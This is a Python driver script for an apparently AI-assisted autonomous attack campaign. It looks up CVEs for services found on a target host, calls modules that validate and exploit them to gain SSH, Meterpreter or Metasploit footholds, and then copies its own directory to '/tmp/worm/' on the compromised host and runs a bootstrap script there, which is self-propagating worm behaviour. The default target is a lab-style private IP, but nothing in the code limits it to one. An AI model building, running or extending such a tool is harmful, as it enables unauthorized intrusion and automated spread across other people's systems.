from analysis import analyze
from discover import run_discovery_phase
from planner import plan_next_actions
from executor import run
from tool_normalizer import normalize_tool_output
from hypothesizer import generate_hypotheses
from progress import assess_progress
from memory import Campaign, Host, build_working_memory
from reflector import evaluate_action_progress
from verify_foothold import verify_foothold, MSF_FOOTHOLD_TYPES
import tools
from tools.base import render_tools, filter_tools
from tools.registry import REGISTRY
import networkx as nx
import os, pickle
from utils import merge, apply_update, sanity_check_args
import hashlib
from validate_exploit import run_vuln_validation_and_exploit

import warnings
warnings.filterwarnings("ignore", category=FutureWarning, module="bitsandbytes")
warnings.filterwarnings("ignore", message=".*_check_is_size.*")
import requests
import time

NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
_cve_cache = {}

def _extract_cvss(cve_data):
    metrics = cve_data.get("metrics", {})
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        if metrics.get(key):
            m = metrics[key][0]
            cd = m.get("cvssData", {})
            return {
                "score": cd.get("baseScore", 0),
                "severity": m.get("baseSeverity") or cd.get("baseSeverity", ""),
                "vector": cd.get("vectorString", ""),
                "attack_vector": cd.get("attackVector", ""),
            }
    return {}

def _parse_nvd_response(data, service, product_filter=None):
    cves = []
    for vuln in data.get("vulnerabilities", []):
        cve_data = vuln["cve"]
        desc = next(
            (d["value"] for d in cve_data.get("descriptions", []) if d["lang"] == "en"),
            "",
        )

        if product_filter:
            haystack = (desc + str(cve_data.get("configurations", []))).lower()
            if product_filter.lower() not in haystack:
                continue

        refs = cve_data.get("references", [])
        weaknesses = [
            w.get("description", [{}])[0].get("value", "")
            for w in cve_data.get("weaknesses", [])
        ]

        cves.append({
            "id": cve_data["id"],
            "description": desc[:500],
            "cvss": _extract_cvss(cve_data),
            "cwe_ids": weaknesses,
            "exploit_available": any(
                "exploit" in r.get("url", "").lower() for r in refs
            ),
            "references": [r["url"] for r in refs[:10]],
            "source": "nvd",
            "matched_service": service.get("name"),
            "matched_product": service.get("product") or service.get("name"),
            "matched_version": service.get("version"),
        })

    cves.sort(key=lambda c: c["cvss"].get("score", 0), reverse=True)
    return cves

def lookup_cves_for_service(service, timeout=20):
    product = service.get("product") or service.get("name")
    version = service.get("version", "")
    vendor = service.get("vendor", "")
    if not product or not version:
        return []

    cache_key = f"{vendor}:{product}:{version}".lower()
    if cache_key in _cve_cache:
        return _cve_cache[cache_key]

    cves = []
    try:
        resp = requests.get(
            NVD_API_URL,
            params={"keywordSearch": f"{product} {version}"},
            timeout=timeout,
        )
        if resp.ok:
            cves = _parse_nvd_response(resp.json(), service, product_filter=product)
    except Exception as e:
        print(f"  [-] NVD keyword lookup error: {e}")

    time.sleep(0.6)
    _cve_cache[cache_key] = cves
    return cves

FOOTHOLD_EXEC_MAP = {
    "ssh_key": "ssh_exec",
    "ssh_key_drop": "ssh_exec",
    "meterpreter": "msf_sessions",
    "msf_shell": "msf_sessions",
    # "webshell": "curl_webshell_exec",
    # "reverse_shell": "shell_session_exec",
}

def select_exec_tools(host):
    if not host.foothold:
        return []
    name = FOOTHOLD_EXEC_MAP.get(host.foothold.get("type"))
    return [REGISTRY[name]] if name and name in REGISTRY else []

test_host = Host(
    id="host1",
    services={},
    facts={},
    state="unknown",
    os=None,
    hostname=None,
    hypotheses=[],
    ip = "192.168.56.101",
    foothold=None,
    vulnerabilities={},
)

# Define memory
campaign = Campaign(
    graph=nx.DiGraph(),
    hosts=[test_host],
)

CHECKPOINT_PATH = "campaign_checkpoint.pkl"

def save_checkpoint(host, campaign, phase_name):
    tmp = CHECKPOINT_PATH + ".tmp"
    state = {
        "host": host,
        "campaign": campaign,
        "phase": phase_name
    }
    with open(tmp, "wb") as f:
        pickle.dump(state, f)
    os.replace(tmp, CHECKPOINT_PATH)
    print(f"\n[CHECKPOINT] Saved state successfully at phase: {phase_name}")

def load_checkpoint():
    if not os.path.exists(CHECKPOINT_PATH):
        return None
    try:
        with open(CHECKPOINT_PATH, "rb") as f:
            state = pickle.load(f)
        print(f"\n[CHECKPOINT] Found save state at phase: {state['phase']}")
        return state
    except Exception as e:
        print(f"\n[CHECKPOINT] Failed to load checkpoint (likely code structure changed): {e}")
        print("[CHECKPOINT] Deleting corrupt checkpoint file. Starting fresh.")
        os.remove(CHECKPOINT_PATH)
        return None
    
# Discover network
pass

# Enumerate host code
phase = "enum_host"

def upload_to_host(host, local_path, remote_path):
    foothold_type = host.foothold.get("type")
    if foothold_type in MSF_FOOTHOLD_TYPES:
        print("[*] Skipping file upload — MSF session footholds use msf_sessions for file ops.")
        return {"code": 0, "stdout": "skipped", "stderr": ""}

    tool = REGISTRY["ssh_put"]
    f = host.foothold["details"]
    argv = tool.build_command({
        "target_ip": host.ip,
        "user": f["user"],
        "key_path": f["local_key_path"],
        "local_path": local_path,
        "remote_path": remote_path,
        "remote_os": "windows" if host.os == "windows" else "unix",
    })
    return run(argv, timeout=180)

COMMANDS = {
    "windows": ["./bootstrap.cmd"],
    "linux": ["./bootstrap.sh"],
    "mac": ["./bootstrap.sh"],
}

def detect_os(exec_fn) -> str:
    r = exec_fn("uname -s")
    if r["code"] == 0:
        out = r["stdout"].strip()
        if out == "Darwin":
            return "mac"
        if out == "Linux":
            return "linux"
    r = exec_fn("echo %OS%")
    if "Windows_NT" in r["stdout"]:
        return "windows"
    return "unknown"

def make_exec_fn(host):
    foothold_type = host.foothold.get("type")

    tool = REGISTRY["ssh_exec"]
    f = host.foothold["details"]

    def exec_fn(command):
        argv = tool.build_command({
            "target_ip": host.ip,
            "user": f["user"],
            "key_path": f["local_key_path"],
            "command": command,
        })
        return run(argv, timeout=30)

    return exec_fn

def run_hardcoded(host):
    if not host.foothold:
        print("[-] No verified foothold; nothing to run.")
        return
    exec_fn = make_exec_fn(host)
    host.os = detect_os(exec_fn)
    print(f"[*] Detected OS: {host.os}")
    for c in COMMANDS.get(host.os, COMMANDS["linux"]):
        r = exec_fn(c)
        print(f"$ {c}  (exit {r['code']})\n{r['stdout']}{r['stderr']}")

ckpt = load_checkpoint()
current_phase = "pre_discovery"

if ckpt:
    test_host = ckpt["host"]
    campaign = ckpt["campaign"]
    current_phase = ckpt["phase"]
    campaign.hosts = [test_host] 

campaign = Campaign(graph=nx.DiGraph(), hosts=[test_host])

current_phase = "pre_discovery"

if os.path.exists(CHECKPOINT_PATH):
    try:
        with open(CHECKPOINT_PATH, "rb") as f:
            ckpt = pickle.load(f)
        
        test_host = ckpt["host"]
        campaign = ckpt["campaign"]
        current_phase = ckpt["phase"]
        
        campaign.hosts = [test_host] 
        
        print(f"\n[CHECKPOINT] Successfully resumed at phase: {current_phase}")
    except Exception as e:
        print(f"\n[CHECKPOINT] Failed to load, starting fresh: {e}")
        os.remove(CHECKPOINT_PATH)

if current_phase == "pre_discovery":
    print("\n" + "="*50)
    print("STAGE: DISCOVERY")
    print("="*50)
    
    discovery_status = run_discovery_phase(test_host, campaign)
    
    if discovery_status == "opportunistic_foothold":
        if verify_foothold(test_host):
            print("[+] Opportunistic foothold verified!")
            current_phase = "post_exploitation"
        else:
            print("[-] False positive foothold. Reverting and moving to validation.")
            test_host.foothold = None
            current_phase = "post_discovery"
    else:
        current_phase = "post_discovery"
        
    save_checkpoint(test_host, campaign, current_phase)


if current_phase == "post_discovery":
    print("\n" + "="*50)
    print("STAGE: VALIDATION & EXPLOIT")
    print("="*50)
    
    if test_host.foothold and verify_foothold(test_host):
        current_phase = "post_exploitation"
    else:
        exploit_status = run_vuln_validation_and_exploit(test_host, campaign)
        
        if exploit_status == "established":
            current_phase = "post_exploitation"
        else:
            print("[-] Campaign failed. Could not establish foothold.")
            exit(1)
            
    save_checkpoint(test_host, campaign, current_phase)


if current_phase == "post_exploitation":
    print("\n" + "="*50)
    print("STAGE: POST-EXPLOITATION")
    print("="*50)
    
    if not test_host.foothold:
        print("[-] Error: Reached post-exploitation but no foothold is set.")
        exit(1)

    upload_to_host(test_host, ".", "/tmp/worm/")
    run_hardcoded(test_host)
    
    if os.path.exists(CHECKPOINT_PATH):
        os.remove(CHECKPOINT_PATH)
        print("[CHECKPOINT] Campaign finished successfully. Checkpoint deleted.")